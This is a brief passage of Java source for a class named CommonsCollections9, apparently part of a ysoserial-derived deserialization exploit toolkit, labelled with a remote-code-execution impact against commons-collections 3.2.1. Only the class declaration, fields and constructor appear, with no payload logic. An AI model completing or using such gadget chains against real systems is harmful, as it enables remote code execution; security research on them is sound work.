...
/**
 * https://github.com/frohoff/ysoserial/blob/newgadgets/src/main/java/ysoserial/payloads/CommonsCollections9.java
 */
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({ Authors.MEIZJM3I})
@Impact(Impact.RCE)
public class CommonsCollections9 extends GadgetChain<ToStringTrampoline> {

    Transformer transformerChain;
    Transformer[] transformers;

    public CommonsCollections9(ToStringTrampoline _trampoline) {
        super(_trampoline);
    }
